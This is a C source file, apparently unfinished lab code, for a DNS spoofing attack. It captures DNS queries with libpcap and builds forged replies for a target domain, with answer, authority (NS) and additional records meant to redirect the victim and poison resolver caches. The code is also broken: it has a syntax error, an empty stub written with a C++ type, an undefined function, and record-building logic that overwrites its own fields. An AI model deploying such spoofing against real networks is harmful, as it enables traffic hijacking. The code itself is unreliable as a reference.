#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#include "myheader.h"


#define BUFSIZE 1500;

int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  //char filter_exp[] = "port 23";
  // Don't sniff the packet from/to the specified ether address
  //char filter_exp[] = "not (ether host 08:00:27:c5:79:5f)";
  char filter_exp[] = "dst port 53";
  bpf_u_int32 net; 

  //Open live pcap session on NIC with name eth0
  handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);	  

  //Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net); 

  pcap_setfilter(handle, &fp); //Setup BPF code on the socket
  pcap_loop(handle, -1, got_packet, NULL); //Capture packets
  pcap_close(handle);   //Close the handle 
  return 0;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  struct ethheader *eth = (struct ethheader *)packet;
  if (ntohs(eth->ether_type) == 0x0800) 
      process_ip((struct ipheader*)(packet + SIZE_ETHERNET));
};


/*Need to dynamically access eth# of attacking machine*/
string get_eth()
{

}

/*Construct DNS Header and Records. Return the size (Header + Records)*/
unsigned short construct_dns_reply(char *buffer)
{
	struct dnsheader *dns = (struct dnsheader *) buffer;

	//construct the DNS header:
	dns->flags=htons(0x8400); //Flag = response; this is a DNS response

	//the number for certain fields
	dns->QDCOUNT=htons(1); // 1 question field
	dns->ANCOUNT=htons(1); // 1 answer field
	dns->NSCOUNT=htons(1); // 1 name server(authority) field
	dns->ARCOUNT=htons(1); // 1 additional fields

	char *p = buffer + 12; // move the pointer to the beginning of DNS data

	if(strstr(p, TARGET_DOMAIN) == NULL){
		return 0;		//only target one specific domain
	}

	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)

	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)

	return p - buffer;
}

/*Construct an "A" record, and return the total size of the record.
If name is NULL, use the offset parameter to construct the "name" field.
If name is not NULL, copy it to the "name" field, and ignore the offset parameter.*/
unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
{
	char *p = buffer;

	if(name == NULL){
		*p = 0xC0;
		p++;
		*p = offset;
		p++;
	} else {
		strcpy(p, name);
		p += strlen(name) + 1;
	}

	*((unsigned short *)p ) = htons(0x0001);	//Record Type
	p += 2;

	*((unsigned short *)p ) = htons(0x0001);	//Class

	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live

	*(unsigned short *)p ) = htons(0x0004);		//Data Length

	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
	p += 4;

	return (p-buffer);

}